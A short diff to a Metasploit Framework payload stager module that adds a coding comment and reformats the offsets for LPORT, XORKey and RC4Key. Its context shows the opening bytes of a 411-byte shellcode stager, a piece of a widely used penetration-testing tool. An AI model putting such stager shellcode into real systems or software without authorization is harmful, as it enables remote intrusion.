@@ -1,3 +1,4 @@
+# -*- coding: binary -*-
 ##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
@@ -32,7 +33,12 @@ module Metasploit3
 			'Stager'        =>
 				{
 					'RequiresMidstager' => false,
-					'Offsets' => { 'LPORT' => [ 200, 'n' ], 'XORKey' => [ 260, '' ], 'RC4Key' => [ 324, '' ] },
+					'Offsets' =>
+						{
+							'LPORT'  => [ 200, 'n' ],
+							'XORKey' => [ 260, '' ],
+							'RC4Key' => [ 324, '' ]
+						},
 					'Payload' =>
 						# Length: 411 bytes
 						"\xFC\xE8\x89\x00\x00\x00\x60\x89\xE5\x31\xD2\x64\x8B\x52\x30\x8B" +
